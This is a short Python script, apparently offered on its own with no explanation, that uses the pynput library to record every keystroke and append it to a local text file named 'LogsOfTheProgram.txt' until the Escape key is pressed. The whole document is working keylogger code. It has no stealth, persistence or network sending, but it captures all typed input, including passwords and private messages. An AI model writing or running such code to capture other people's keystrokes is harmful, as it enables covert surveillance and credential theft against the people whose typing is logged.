from pynput import keyboard

def on_press(key):
    try:
        MyCurrentKey = str(key.char)
    except AttributeError:
        if key == key.space:
            MyCurrentKey = " "
        else:
            MyCurrentKey = " " + str(key) + " "

    with open("LogsOfTheProgram.txt", "a") as f:
        f.write(MyCurrentKey)

def on_release(key):
    if key == keyboard.Key.esc: #use escape button to exit.
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
